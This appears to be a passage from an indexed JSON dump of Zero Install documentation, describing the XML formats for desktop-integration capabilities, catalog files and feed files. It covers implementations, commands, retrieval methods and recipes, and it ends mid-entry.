<p>See: Verbs, Icons</p> <ul> <li>a single <code>&lt;verb&gt;</code>: creates a simple context menu, named using the <code>&lt;description&gt;</code> inside <code>&lt;verb&gt;</code></li> <li>multiple <code>&lt;verb&gt;</code>s (since version 2.18): creates a cascading context menu, named using the <code>&lt;description&gt;</code> inside <code>&lt;context-menu&gt;</code>, with sub-entries named using the <code>&lt;description&gt;</code> inside <code>&lt;verb&gt;</code></li> </ul>"},{"location":"specifications/capabilities/#autoplay-handlers","title":"AutoPlay handlers","text":"<p>An application's ability to handle AutoPlay events. </p> <pre><code>&lt;auto-play id='...' provider='...' ?&gt;\n  &lt;event name='...'/&gt; *\n  &lt;description xml:lang='...' ?&gt;...&lt;/description&gt; *\n  [verb]\n  [icon] *\n&lt;/auto-play&gt;\n</code></pre> <code>id</code> An ID that uniquely identifies this AutoPlay handler within the feed. Must be a safe ID. <code>provider</code> The name of the application as shown in the AutoPlay selection list. <code>&lt;event&gt;</code> A specific AutPlay event. Well-known values on Windows are: <code>PlayCDAudioOnArrival</code>, <code>PlayDVDAudioOnArrival</code>, <code>PlayMusicFilesOnArrival</code>, <code>PlayVideoCDMovieOnArrival</code>, <code>PlaySuperVideoCDMovieOnArrival</code>, <code>PlayDVDMovieOnArrival</code>, <code>PlayBluRayOnArrival</code>, <code>PlayVideoFilesOnArrival</code>, <code>HandleCDBurningOnArrival</code>, <code>HandleDVDBurningOnArrival</code>, <code>HandleBDBurningOnArrival</code> <code>&lt;description&gt;</code> A (localized) description of the AutoPlay handler. <p>See: Verbs, Icons</p>"},{"location":"specifications/capabilities/#registration","title":"Registration","text":"<p>Indicates that an application should be listed in the \"Set your Default Programs\" UI (Windows Vista and later).</p> <pre><code>&lt;registration id='...' capability-reg-path='...' /&gt;\n</code></pre> <code>id</code> An ID that uniquely identifies this hook within the feed. Must be a safe ID. <code>capability-reg-path</code> The registry path relative to <code>HKEY_CURRENT_USER</code> or <code>HKEY_LOCAL_MACHINE</code> which should be used to store the application's capability registration information."},{"location":"specifications/capabilities/#default-programs","title":"Default programs","text":"<p>Ability to act as default programs for well-known services such web-browser or e-mail client.</p> <pre><code>&lt;default-program id='...' service='...' explicit-only='true' ? /&gt;\n</code></pre> <code>id</code> An ID that uniquely identifies this default program registration within the feed. Must be a safe ID. Also serves as a programmatic identifier within the desktop environment. In case of conflicts, the first default program registration listed with a specific ID will take precedence. <code>service</code> The name of the service the application provides.   Well-known values on Windows are: <code>Mail</code>, <code>Media</code>, <code>IM</code>, <code>JVM</code>, <code>Calender</code>, <code>Contacts</code>, <code>Internet Call</code> <code>explicit-only</code> When set to <code>true</code> the app is not registered as a default program without explicit confirmation from the user."},{"location":"specifications/capabilities/#browser-native-messaging","title":"Browser native messaging","text":"<p>An application's ability to act as a browser native messaging host. Supported since version 2.28.</p> <pre><code>&lt;native-messaging id='...' name='...' browser='...' command='...' ? explicit-only='true' ?&gt;\n  &lt;browser-extension id='...'/&gt; *\n&lt;/native-messaging&gt;\n</code></pre> <code>id</code> An ID that uniquely identifies this native messaging entry within the feed. Must be a safe ID. <code>name</code> The name used to call the native messaging host from browser extensions.   Can only contain lowercase alphanumeric characters, underscores (<code>_</code>) and dots (<code>.</code>). Can't start or end with a dot, and a dot can't be followed by another dot. <code>browser</code> Space-separated list of browsers the native messaging host can be registered in.   Well-known values currently are:<code>Firefox</code>,  <code>Chrome</code>, <code>Chromium</code>, <code>Edge</code>, <code>Opera</code>, <code>Brave</code>, <code>Vivaldi</code> <code>command</code> The name of the command in the feed to use. Defaults to <code>run</code> if not set. <code>explicit-only</code> When set to <code>true</code> this context menu entry is not added without explicit confirmation from the user. <code>&lt;browser-extension&gt;</code> Browser extension that should have access to the native messaging host. <code>id</code> contains the ID of the browser extension, without prefixes like <code>chrome-extension://</code>."},{"location":"specifications/capabilities/#remove-hook","title":"Remove hook","text":"<p>A hook/callback into the application to be called during <code>0install remove</code>. Supported since version 2.23.</p> <p>The hook will not be called if the application is not in the cache or if <code>--batch</code> is specified.</p> <pre><code>&lt;remove-hook id='...' command='...' ?&gt;\n  &lt;arg&gt; ... &lt;/arg&gt; *\n&lt;/remove-hook&gt;\n</code></pre> <code>id</code> An ID that uniquely identifies this hook within the feed. Must be a safe ID. <code>command</code> The name of the command in the feed to use when a removal of the app is requested. Defaults to <code>run</code> if not set. <code>&lt;arg&gt;</code> Command-line argument to be passed to the command. Will be automatically escaped to allow proper concatenation of multiple arguments containing spaces."},{"location":"specifications/capabilities/#verbs","title":"Verbs","text":"<p>Some capabilities require you to map verbs/actions to specific commands in the feed.</p> <pre><code>&lt;verb name='...' command='...' ? args='...' ? single-element-only='true' ? extended='true' ?&gt;\n  &lt;description xml:lang='...' ?&gt;...&lt;/description&gt; *\n  &lt;arg&gt; ... &lt;/arg&gt; *\n&lt;/verb&gt;\n</code></pre> <code>name</code> The name of the verb. Must be a safe ID.   Use canonical names (<code>open</code>, <code>opennew</code>, <code>edit</code>, <code>play</code>, <code>print</code>, <code>Preview</code>) to get automatic localization; specify <code>&lt;description&gt;</code>s otherwise. <code>command</code> The name of the command to use when launching via this capability. Defaults to <code>run</code> if not set. <code>args</code> Command-line arguments to be passed to the command in escaped form. <code>%V</code> gets replaced with the path of the file being opened.   This is ignored if any <code>&lt;arg&gt;</code> elements are specified. <code>single-element-only</code> - since version 2.21 Set this to true to hide the verb if more than one element is selected.   Use this to help avoid running out of resources if the user opens too many files. <code>extended</code> Set this to <code>true</code> to hide the verb in the Windows context menu unless the Shift key is pressed when opening the menu. <code>&lt;description&gt;</code> A (localized) description of the verb. <code>&lt;arg&gt;</code> - since version 2.18 Command-line argument to be passed to the command. Will be automatically escaped to allow proper concatenation of multiple arguments containing spaces.   <code>${item}</code> gets replaced with the path of the file being opened."},{"location":"specifications/capabilities/#icons","title":"Icons","text":"<p>Some capabilities allow you to specify an icon.</p> <pre><code>&lt;icon xmlns='http://zero-install.sourceforge.net/2004/injector/interface' type='...' href='...' ?/&gt;\n</code></pre> <p>Attention</p> <p>Since <code>&lt;icon&gt;</code> is defined by the regular feed format, you need to explicitly specify the XML namespace as shown above, when placing <code>&lt;icon&gt;</code>s within capabilities.</p> <code>type</code> The MIME type of the icon. Should be <code>image/vnd.microsoft.icon</code> (<code>.ico</code>) for Windows. <code>href</code> The URL where the icon can be downloaded."},{"location":"specifications/capabilities/#safe-id","title":"Safe ID","text":"<p>A safe ID may only contain alphanumeric characters, spaces (), dots (<code>.</code>), underscores (<code>_</code>), hyphens (<code>-</code>) and plus signs (<code>+</code>). It also serves as a programmatic identifier within the desktop environment. In case of conflicts, the first element listed with a specific ID will take precedence.</p>"},{"location":"specifications/capabilities/#further-reading","title":"Further reading","text":"<ul> <li>Paper: Desktop Integration Management for Portable, Zero-Install and Virtualized Applications</li> </ul>"},{"location":"specifications/catalog/","title":"Catalog files","text":"<p>This document is a formal description of the XML catalog format. A catalog contains meta-data for a collection of feeds. Catalogs make it easier to find feeds for specific applications.</p> <p> XML Schema Definition</p>"},{"location":"specifications/catalog/#syntax","title":"Syntax","text":"<p>Catalog files have the following syntax (<code>?</code> follows optional items, <code>*</code> means zero-or-more, order of elements is not important, and extension elements can appear anywhere as long as they use a different namespace):</p> <pre><code>&lt;?xml version='1.0'?&gt;\n&lt;catalog xmlns='http://0install.de/schema/injector/catalog'&gt;\n  &lt;interface uri='...' xmlns='http://zero-install.sourceforge.net/2004/injector/interface'&gt;\n    &lt;name&gt;...&lt;/name&gt;\n    &lt;summary&gt;...&lt;/summary&gt;\n    &lt;description&gt;...&lt;/description&gt; ?\n    &lt;homepage&gt;...&lt;/homepage&gt; ?\n    &lt;category type='...' ? &gt;...&lt;/category&gt; *\n    &lt;needs-terminal/&gt; ?  \n    &lt;icon type='...' href='...'/&gt; *\n    &lt;entry-point command='...' binary-name='...' ? /&gt; *\n  &lt;/interface&gt; *\n&lt;/catalog&gt;\n</code></pre> <p>The syntax within <code>&lt;interface&gt;</code> elements is identical to that of feeds.</p> <p>Each <code>&lt;interface&gt;</code> element represents a feed and contains a copy of that feed's body. However, <code>&lt;implementation&gt;</code>, <code>&lt;group&gt;</code>, <code>&lt;feed&gt;</code>, <code>&lt;feed-for&gt;</code> and <code>&lt;replaced-by&gt;</code> elements are omitted. They should instead be taken from the original feed, which can be downloaded from the specified <code>uri</code> when required.</p>"},{"location":"specifications/catalog/#digital-signatures","title":"Digital signatures","text":"<p>When a catalog is downloaded from the web, it must contain a digital signature. A catalog is signed by appending an XML comment block of the form:</p> <pre><code>&lt;!-- Base64 Signature\niD8DBQBEXM/qrgeCgFmlPMERArNSAKDBuNz5SQMZ8rwJmW2fhNHJwor6KwCgwx7XEfY+6gUC90rJ\nb5eCY+I8HNA=\n\n--&gt;\n</code></pre> <p>This block must go at the end of the file, and contains a Base64-encoded version of the file that would be created by using <code>gpg --detach-sign</code> on the original feed. The signature block must start on a new line, may not contain anything except valid base64 characters, and nothing may follow the signature block.</p> <p>This is identical to the signature format used by feeds.</p>"},{"location":"specifications/catalog/#generating","title":"Generating","text":"<p>Catalog files are automatically generated by 0repo.</p> <p>You can also manually generate a catalog from a set of feeds downloaded to a local directory:</p> <pre><code>0install run https://apps.0install.net/0install/0publish.xml feeds/*.xml --catalog=catalog.xml --xmlsign\n</code></pre> <p>Note</p> <p>A catalog generated like this points to the locations the feeds originally came from, not the local XML files on your disk.</p>"},{"location":"specifications/catalog/#usage","title":"Usage","text":"<p>Catalog files are currently only used by Zero Install for Windows.</p> <p>You can search for feeds in catalogs like this:</p> <pre><code>0install catalog search KEYWORD\n</code></pre> <p>See the command-line interface documentation for more commands.</p>"},{"location":"specifications/catalog/#short-names","title":"Short names","text":"<p>Catalogs allow you to use short names on the command-line instead of entering full feed URIs. Short names are either equal to the application <code>&lt;name&gt;</code> as listed in the catalog (spaces replaced with dashes) or the application's <code>binary-name</code> specified in an <code>&lt;entry-point&gt;</code>.</p> <p>For example, instead of <code>0install run https://apps.0install.net/gui/vlc.xml</code> you can use:</p> <ul> <li><code>0install run vlc-media-player</code> (application name) or</li> <li><code>0install run vlc</code> (executable file name)</li> </ul>"},{"location":"specifications/catalog/#gui","title":"GUI","text":"<p>The main GUI of Zero Install for Windows displays a list of available applications populated by one or more catalogs. The default catalog can be extended with or replaced by custom catalogs in the Catalog tab of the Options window.</p> <p></p>"},{"location":"specifications/catalog/#well-known-catalogs","title":"Well-known catalogs","text":"<ul> <li>https://apps.0install.net/ - repository of common tools, libraries and runtime environments</li> </ul>"},{"location":"specifications/feed/","title":"Feed files","text":"<p>This document is a formal description of the XML feed file format. An interface describes a program, library or other component. A feed provides a list of known implementations of the interface (versions of the program) and details about how to get them, how to check that they are authentic, how to run them and what other components they depend on.</p> <p> XML Schema Definition</p> <p>This class diagram shows how the different concepts are related. Each feed file contributes information to this model:</p> <p></p> <p>Each Feed lists a number of Implementations (versions). An Identity is a way to recognise an Implementation (e.g. a cryptographic digest). A Retrieval method is a way to get an Implementation (e.g. by downloading from a web site). A Command says how to run an Implementation as a program. A Dependency indicates that one component depends on another (e.g. Gimp requires the GTK library). A Binding says how to let the program locate the Implementations when run. A Constraint limits the choice of a dependency (e.g. Gimp requires a version of GTK &gt;= 2.6).</p> <p>Terminology</p> <p>Originally the word 'interface' was used to mean both 'interface' and 'feed', so don't be confused if you see it used this way.</p>"},{"location":"specifications/feed/#introduction","title":"Introduction","text":"<p>Feed files are introduced in the Packager's Documentation. They have the following syntax (<code>?</code> follows optional items, <code>*</code> means zero-or-more, order of elements is not important, and extension elements can appear anywhere as long as they use a different namespace):</p> <pre><code>&lt;?xml version='1.0'?&gt;\n&lt;interface xmlns='http://zero-install.sourceforge.net/2004/injector/interface'\n           min-injector-version='...' ?\n           uri='...' ? &gt;\n  &lt;name&gt;...&lt;/name&gt;\n  &lt;summary xml:lang='...' ?&gt;...&lt;/summary&gt; +\n  &lt;description xml:lang='...' ?&gt;...&lt;/description&gt; *\n  &lt;publisher&gt;...&lt;/publisher&gt; ?\n  &lt;homepage&gt;...&lt;/homepage&gt; ?\n  &lt;category type='...' ? &gt;...&lt;/category&gt; *\n  &lt;needs-terminal/&gt; ?\n\n  &lt;icon type='...' href='...'/&gt; *\n  &lt;splash-screen type='...' href='...'/&gt; *\n\n  &lt;feed src='...' langs='...' ? arch='...' ?/&gt; *\n  &lt;feed-for interface='...'/&gt; *\n  &lt;replaced-by interface='...'/&gt; ?\n\n  [group] *\n  [implementation] *\n  [entry-point] *\n&lt;/interface&gt;\n</code></pre> <code>min-injector-version</code> This attribute gives the oldest version of 0install that can read this file. Older versions will tell the user to upgrade if they are asked to read the file. Versions prior to 0.20 do not perform this check, however. If the attribute is not present, the file can be read by all versions. <code>uri</code> This attribute is only needed for remote feeds (fetched via HTTP). The value must exactly match the expected URL, to prevent an attacker replacing one correctly-signed feed with another (e.g., returning a feed for the <code>shred</code> program when the user asked for the <code>backup</code> program). <code>&lt;name&gt;</code> a short name to identify the feed or program (e.g. \"Foo\") <code>&lt;summary&gt;</code> a short one-line description; the first word should not be upper-case unless it is a proper noun (e.g. \"cures all ills\"). Supports localization. <code>&lt;description&gt;</code> a full description, which can be several paragraphs long (optional since 0.32, but recommended). Supports localization. <code>&lt;publisher&gt;</code> the publisher (company or organization) of the program. <code>&lt;homepage&gt;</code> the URL of a web-page describing feed or program in more detail. <code>&lt;category&gt;</code> a classification for the interface. If no type is given, then the category is one of the 'Main' categories defined by the freedesktop.org menu specification. Otherwise, it is a URI giving the namespace for the category. <code>&lt;needs-terminal&gt;</code> if present, this element indicates that the program requires a terminal in order to run. Graphical launchers should therefore run this program in a suitable terminal emulator. <code>&lt;icon&gt;</code> an icon to use for the program; this is used by programs such as AddApp and desktop integration. You should provide an icon of the type <code>image/png</code> (<code>.png</code>) for display in browsers and launchers on Linux. For Windows apps you should additionally provide an icon of the type <code>image/vnd.microsoft.icon</code> (<code>.ico</code>). For macOS apps you should additionally provide an icon of the type <code>image/x-icns</code> (<code>.icns</code>). <code>&lt;splash-screen&gt;</code> a splash screen Zero Install can display during downloads, etc. for better branding. On Windows splash screens of the type <code>image/png</code> (<code>.png</code>) are supported. This is currently only used by Zero Install for Windows and when desktop integration is applied. <code>&lt;feed&gt;</code> the linked feed contains more implementations of this feed's interface. The <code>langs</code> and <code>arch</code> attributes, if present, indicate that all implementations will fall within these limits (e.g. <code>arch='*-src'</code> means that there is no point fetching this feed unless you are looking for source code). See the <code>&lt;implementation&gt;</code> element for a description of the values of these attributes. <code>&lt;feed-for&gt;</code> the implementations in this feed are implementations of the given interface. This is used when adding an optional extra feed to an interface with <code>0install add-feed</code> (e.g. a local feed for a development version). <code>&lt;replaced-by&gt;</code> this feed's interface (the one in the root element's <code>uri</code> attribute) has been replaced by the given interface. Any references to the old URI should be updated to use the new one."},{"location":"specifications/feed/#groups","title":"Groups","text":"<p>A group has this syntax:</p> <pre><code>&lt;group version='...' ?\n       released='...' ?\n       main='...' ?\n       self-test='...' ?\n       doc-dir='...' ?\n       license='...' ?\n       released='...' ?\n       stability='...' ?\n       rollout-percentage='...' ?\n       langs='...' ?\n       arch='...' ? &gt;\n  [requires] *\n  [group] *\n  [command] *\n  [binding] *\n  [implementation] *\n  [package-implementation] *\n&lt;/group&gt;\n</code></pre> <p>All attributes of the group are inherited by any child groups and implementations as defaults, but can be overridden there. All dependencies (<code>requires</code>), bindings and commands are inherited (sub-groups may add more dependencies and bindings to the list, but cannot remove anything).</p>"},{"location":"specifications/feed/#implementations","title":"Implementations","text":"<p>An implementation has this syntax (an unspecified argument is inherited from the closest ancestor <code>&lt;group&gt;</code> which defines it):</p> <pre><code>&lt;implementation id='...'\n                local-path='...' ? \n                [all &lt;group&gt; attributes] &gt;\n  &lt;manifest-digest [digest] * /&gt; *\n  [command] *\n  [retrieval-method] *\n  [binding] *\n  [requires] *\n&lt;/implementation&gt;\n</code></pre> <p></p> <code>id</code> A unique identifier for this implementation. For example, when the user marks a particular version as buggy this identifier is used to keep track of it, and saving and restoring selections uses it. However, see the important historical note below. <code>local-path</code> If the feed file is a local file (the interface <code>uri</code> starts with <code>/</code>) then the <code>local-path</code> attribute may contain the pathname of a local directory (either an absolute path or a path relative to the directory containing the feed file). See the historical note below. <code>version</code> The version number. See the version numbers section below for more details. <code>main</code> (deprecated) The relative path of an executable inside the implementation that should be executed by default when the interface is run. If an implementation has no <code>main</code> setting, then it cannot be executed without specifying one manually (with <code>0install run --main=MAIN</code>). This typically means that the interface is for a library. Note: <code>main</code> is being replaced by the <code>&lt;command&gt;</code> element. <code>self-test</code> (deprecated) The relative path of an executable inside the implementation that can be executed to test the program. The program must be non-interactive (e.g. it can't open any windows or prompt for input). It should return with an exit status of zero if the tests pass. Any other status indicates failure. Note: <code>self-test</code> is being replaced by the <code>&lt;command&gt;</code> element. <code>doc-dir</code> The relative path of a directory inside the implementation that contains the package's documentation. This is the directory that would end up inside <code>/usr/share/doc</code> on a traditional Linux system. <code>released</code> The date this implementation was made available, in the format <code>YYYY-MM-DD</code>. For development versions checked out from version control this attribute should not be present. <code>stability</code> The default stability rating for this implementation. If not present, <code>testing</code> is used. See Stability for more details. <code>rollout-percentage</code> - since version 2.21, Windows only The percentage (0-100) of users that should treat this as <code>stability=\"stable\"</code>. May only be set if <code>stability</code> is unset or <code>testing</code>. This can be used to perform staged rollouts. <code>langs</code> The natural language(s) which this package supports, as a space-separated list of languages codes (in the same format as used by the <code>$LANG</code> environment variable). For example, the value <code>en_GB fr</code> would be used for a package supporting British English and French. Supported since 0.48. Note that versions before 0.54 require the region separator to be <code>_</code> (underscore), while later versions also allow the use of <code>-</code> for consistency with the <code>xml:lang</code> format. <code>arch</code> For platform-specific binaries, the platform for which this implementation was compiled, in the form <code>os-cpu</code>. 0install knows that certain platforms are backwards-compatible with others, so binaries with <code>arch=\"Linux-i486\"</code> will still be available on <code>Linux-i686</code> machines, for example. Either the <code>os</code> or <code>cpu</code> part may be <code>*</code>, which will make it available on any OS or CPU. If missing, the default is <code>*-*</code>. See also: Valid architecture names. <code>license</code> License terms. This is typically a Trove category. See the PyPI list for some examples (the leading <code>License ::</code> is not included). <p>The <code>manifest-digest</code> element is used to give digests of the .manifest file using various hashing algorithms (but see the historical note below). Having multiple algorithms allows a smooth upgrade to newer digest algorithms without breaking old clients. Each non-namespaced attribute gives a digest, with the attribute name being the algorithm.</p> <p>Example</p> <pre><code>&lt;manifest-digest sha256=\"4f078f9080bd9b3b87e8360f014268886ec653ed077bb3cb6725185c0a07473a\"/&gt;\n</code></pre> <p>For non-local implementations (those without a <code>local-path</code> attribute), the <code>&lt;implementation&gt;</code> element contains a set of retrieval methods, each of which gives a different way of getting the implementation (i.e. of getting a directory structure whose digest matches the ones given).</p> <p>Currently, 0install always chooses the first of the methods it understands, but in future it may use other strategies (such as choosing the closest mirror, or letting the user select one manually). It may also use other methods which aren't listed, such as searching for the implementation on a peer-to-peer network.</p> <p>Unrecognised elements inside an implementation are ignored.</p>"},{"location":"specifications/feed/#historical-note-about-id","title":"Historical note about id","text":"<p>0install &gt;= 0.45 generally treats the ID as a simple identifier, and gets the local path (if any) from the <code>local-path</code> attribute and the digests from the <code>&lt;manifest-digest&gt;</code>.</p> <p>0install &lt; 0.45 ignores the <code>local-path</code> attribute and the <code>&lt;manifest-digest&gt;</code> element. If the ID starts with <code>.</code> or <code>/</code> then the ID is also the local path; otherwise, it is the single manifest digest.</p> <p>For backwards compatibility, 0install &gt;= 0.45 will treat an ID starting with <code>.</code> or <code>/</code> as a local path if no <code>local-path</code> attribute is present, and it will treat it as an additional digest if it contains an <code>=</code> character.</p> <p>Therefore, if you want to generate feeds compatible with past and future versions:</p> <ul> <li>If you have a digest, set the ID to <code>sha1new=...</code> and put the sha256 digest in the <code>&lt;manifest-digest&gt;</code>.</li> <li>If you have a local implementation then set both <code>id</code> and <code>local-path</code> to the pathname.</li> </ul>"},{"location":"specifications/feed/#commands","title":"Commands","text":"<p>The <code>main</code> attribute above provides a simple way to say how to run this implementation. The <code>&lt;command&gt;</code> element (supported since 0.51, released Dec 2010) provides a more flexible alternative.</p> <pre><code>&lt;command name='...'\n         path='...' ? &gt;\n  &lt;arg&gt; ... &lt;/arg&gt; *\n  &lt;for-each item-from='...' separator='...'? &gt; ... &lt;/for-each&gt; *\n  &lt;working-dir src='...'? /&gt; ?\n  [requires] *\n  [binding] *\n  [runner] ?\n&lt;/command&gt;\n</code></pre> <code>name</code> By default, 0install executes the <code>run</code> command, but the <code>--command</code> option can be used to specify a different one. 0test runs the <code>test</code> command (replacing the old <code>self-test</code> attribute) and 0compile runs the <code>compile</code> command (replacing the <code>compile:command</code> attribute). <code>path</code> The relative path of the executable within the implementation (optional if <code>&lt;runner&gt;</code> is used). <p>Additional arguments can be passed using the <code>&lt;arg&gt;</code> element. Within an argument, <code>${name}</code> is expanded to the value of the corresponding environment variable. These arguments are passed to the program before any arguments specified by the user.</p> <p>If an environment variable should be expanded to multiple arguments, use <code>&lt;for-each&gt;</code>. The variable in the <code>item-from</code> attribute is split using the given separator (which defaults to the OS path separator, <code>:</code> on POSIX and <code>;</code> on Windows) and the arguments inside the element are added for each item. The current item is available as <code>${item}</code>. If the variable given in <code>item-from</code> is not set or is empty, no arguments are added. See below for an example. Versions of 0install before 1.15 ignore <code>&lt;for-each&gt;</code> elements and their contents.</p> <p>The <code>&lt;working-dir&gt;</code> element (Windows only) switches the working directory of the process to a relative path within the implementation specified by <code>src</code> (defaults to <code>.</code>). This is useful for supporting legacy Windows applications which do not properly locate their installation directory.</p> <p>Command-specific dependencies can be specified for a command by nesting <code>&lt;requires&gt;</code> elements. For example, an interpreter might only depend on libreadline when used interactively, but not when used as a library, or the <code>test</code> command might depend on a test framework.</p> <p>Command-specific bindings (0install &gt;= 1.3) create a binding from the implementation to itself. For example, the <code>test</code> command may want to make the <code>run</code> command available in <code>$PATH</code> using <code>&lt;executable-in-path&gt;</code>.</p> <p>The <code>&lt;runner&gt;</code> element introduces a special kind of dependency: the program that is used to run this one. For example, a Python program might specify Python as its runner. <code>&lt;runner&gt;</code> is a subclass of <code>&lt;requires&gt;</code> and accepts the same attributes and child elements. In addition, you can specify arguments to pass to the runner by nesting them inside the <code>&lt;runner&gt;</code> element. These arguments are passed before the path of the executable given by the <code>path</code> attribute.</p> <p>Example</p> <pre><code>&lt;command name='run' path=\"causeway.e-swt\"&gt;\n  &lt;runner interface='http://repo.roscidus.com/e/e-core'&gt;\n    &lt;arg&gt;-cpa&lt;/arg&gt;\n    &lt;arg&gt;$SWT_JAR&lt;/arg&gt;\n    &lt;for-each item-from=\"EXTRA_E_OPTIONS\" separator=\" \"&gt;\n      &lt;arg&gt;${item}&lt;/arg&gt;\n    &lt;/for-each&gt;\n  &lt;/runner&gt;\n&lt;/command&gt;\n</code></pre> <p>In this case, 0install will run the equivalent of <code>/path/to/e-interpreter -cpa /path/to/swt.jar $EXTRA_E_OPTIONS /path/to/causeway.e-swt</code>.</p>"},{"location":"specifications/feed/#package-implementations","title":"Package implementations","text":"<p>This element names a distribution-provided package which, if present, is a valid implementation of this interface. The syntax is:</p> <pre><code>&lt;package-implementation package='...'\n                        distributions='...' ?\n                        main='...' ? \n                        version='...' ? &gt;\n  [command] *\n  [requires] *\n&lt;/package-implementation&gt;\n</code></pre> <p>Support for distribution packages was added in version 0.28 of 0install. Earlier versions ignore this element.</p> <p>If the named package is available then it will be considered as a possible implementation of the interface. If <code>main</code> is given then it must be an absolute path.</p> <p>If the <code>distributions</code> attribute is present then it is a space-separated list of distribution names where this element applies. 0install &gt;= 0.45 ranks the <code>&lt;package-implementation&gt;</code> elements according to how well they match the host distribution and then only uses the best match (or matches, if several get the same score). See Distribution integration for a list of supported distributions.</p> <p>Earlier versions of 0install ignore the <code>distributions</code> attribute and process all of the elements.</p> <p>Note that, unlike a normal implementation, a distribution package does not resolve to a directory. Any bindings inside <code>&lt;requires&gt;</code> elements for the interface will be ignored; it is assumed that the requiring component knows how to use the packaged version without further help. Therefore, adding distribution packages to your interface considerably weakens the guarantees you are making about what the requester may get.</p> <p>Package implementations still inherit attributes and dependencies from their parent group. The <code>doc-dir</code> and <code>license</code> attributes may be given, but <code>version</code> and <code>released</code> are read from the native packaging system.</p> <p>If <code>version</code> is given then only implmentations matching this pattern are used (0install &gt;= 2.14). This allows multiple <code>&lt;packages-implmentation&gt;</code> elements for a single distribution package, which is useful if different versions have different requirements. See Constraints for the syntax.</p>"},{"location":"specifications/feed/#retrieval-methods","title":"Retrieval methods","text":"<p>A retrieval method is a way of getting an implementation.</p> <p></p> <p>The most common retrieval method is the <code>&lt;archive&gt;</code> element:</p> <pre><code>&lt;archive href='...'\n         size='...'\n         extract='...' ?\n         dest='...' ?\n         type='...' ?\n         start-offset='...' ? /&gt;\n</code></pre> <p>This states that an archive may be downloaded from the address given in the <code>href</code> attribute. The archive must have the given <code>size</code> or it will be rejected. When unpacked (either the subdirectory named in the <code>extract</code> attribute, or the whole archive if it is not present), the resulting tree will generate a manifest with the secure hash value given as the implementation's <code>id</code>. If <code>dest</code> is given (0install &gt;= 2.1), then the archive is unpacked to the specified subdirectory. It is an error to specify a target outside of the implementation directory (e.g. <code>../foo</code> or attempting to follow a symlink that points out of the implementation).</p> <p>Note that the <code>extract</code> attribute cannot contain <code>/</code> or <code>\\</code> characters, so it can only be used to extract a top-level directory. It is intended for archives that contain their own name as the single top-level entry.</p> <p>The type of the archive is given as a MIME type in the <code>type</code> attribute (since 0install version 0.21). If missing, the type is guessed from the extension on the <code>href</code> attribute (all versions). Known types and extensions (case insensitive) are:</p> <ul> <li><code>application/zip</code> (<code>.zip</code>)</li> <li><code>application/x-tar</code> (<code>.tar</code>)</li> <li><code>application/x-compressed-tar</code> (<code>.tar.gz</code> or <code>.tgz</code>)</li> <li><code>application/x-bzip-compressed-tar</code> (<code>.tar.bz2</code> or <code>.tbz2</code>)</li> <li><code>application/x-xz-compressed-tar</code> (<code>.tar.xz</code> or <code>.txz</code>) - since version 0.43, since version 2.11 on Windows</li> <li><code>application/x-lzma-compressed-tar</code> (<code>.tar.lzma</code> or <code>.tlzma</code>)</li> <li><code>application/x-lzip-compressed-tar</code> (<code>.tar.lz</code> or <code>.tlz</code>) - since version 2.18, Windows only</li> <li><code>application/x-zstd-compressed-tar</code> (<code>.tar.zst</code>) - since version 2.18, Windows only</li> <li><code>application/x-ruby-gem</code> (<code>.gem</code>) - since version 1.0-rc1</li> <li><code>application/x-7z-compressed</code> (<code>.7z</code>) - Windows only</li> <li><code>application/vnd.rar</code> (<code>.rar</code>) - since version 2.18, Windows only</li> <li><code>application/vnd.ms-cab-compressed</code> (<code>.cab</code>)</li> <li><code>application/x-msi</code> (<code>.msi</code>) - Windows only</li> <li><code>application/x-deb</code> (<code>.deb</code>) - Linux only</li> <li><code>application/x-rpm</code> (<code>.rpm</code>) - Linux only</li> <li><code>application/x-apple-diskimage</code> (<code>.dmg</code>) - macOS only</li> </ul> <p>The <code>start-offset</code> attribute (since version 0.21) gives the number of bytes at the beginning of the file which should be ignored. This is useful for some self-extracting archives which are made up of a shell script followed by a normal archive in a single file. If missing, it defaults to 0. The value in the <code>size</code> attribute does not include the skipped bytes.</p> <p>You can also fetch individual files (0install &gt;= 2.1). This is useful for e.g. jar files, which are typically not unpacked:</p> <pre><code>&lt;file href='...'\n      size='...'\n      dest='...'\n      executable='true|false' ? /&gt;\n</code></pre> <p>The file is downloaded from <code>href</code>, must be of the given <code>size</code>, and is placed within the implementation directory as <code>dest</code>. If <code>executable</code> is set to <code>true</code> (0install &gt;= 2.14.2) the file is marked as executable after download.</p>"},{"location":"specifications/feed/#recipes","title":"Recipes","text":"<p>An implementation can also be created by following a <code>&lt;recipe&gt;</code>:</p> <pre><code>&lt;recipe&gt;\n  ( &lt;archive ...&gt; | &lt;file ...&gt; | &lt;rename ...&gt; | &lt;remove ...&gt; | &lt;copy-from ...&gt; ) +\n&lt;/recipe&gt;\n</code></pre> <p>In this case, each child element of the recipe represents a step. To get an implementation by following a recipe, a new empty directory is created and then all of the steps are performed in sequence. The resulting directory must have the digest given in the implementation's <code>&lt;manifest-digest&gt;</code>. A recipe containing only a single archive is equivalent to just specifying the archive on its own. If a recipe contains an unrecognised element then the whole recipe must be ignored.</p> <code>&lt;archive ...&gt;</code> Causes the named archive to be fetched and unpacked over the top of whatever is currently in the temporary directory. It supports the same attributes as when used outside of a recipe. <code>&lt;file ...&gt;</code> Causes the named file to be fetched and saved over the top of whatever is currently in the temporary directory (0install &gt;= 2.1). It supports the same attributes as when used outside of a recipe. <code>&lt;rename source='...' dest='...'&gt;</code> Renames or moves a file or directory (0install &gt;= 1.10). It is an error if the source or destination are outside the implementation. <code>&lt;remove path='...'&gt;</code> Delete the file or directory from the implementation (0install &gt;= 2.1). It is an error if the path is outside the implementation. <code>&lt;copy-from id='...' source='...' ? dest='...' ?&gt;</code> Copies files or directories from another implementation, e.g., for applying an update to a previous version (0install &gt;= 2.13). The specified id must exactly match the id attribute of another implementation specified elsewhere in the same feed. You can specify the source and destination file or directory to be copied relative to the implementation root. Leave them unset to copy the entire implementation. <p>Tip</p> <p>A recipe is generally only useful for patching existing archives without having to host the complete result yourself. Normally, if your program requires files from several different packages then it is better to use the <code>&lt;requires&gt;</code> element instead. This allows libraries to be shared between different programs, and lets the user choose the versions and upgrade them individually.</p>"},{"location":"specifications/feed/#dependencies","title":"Dependencies","text":"<p>A <code>&lt;requires&gt;</code> element means that every implementation within the same group (including nested sub-groups) requires an implementation of the specified interface when run. 0install will choose a suitable implementation, downloading one if required.</p> <pre><code>&lt;requires interface='...'\n          importance='...' ?\n          version='...' ?\n          os='...' ?\n          distribution='...' ?\n          source='true|false' ?\n          use='...' ? &gt;\n  [ constraints ] *\n  [ bindings 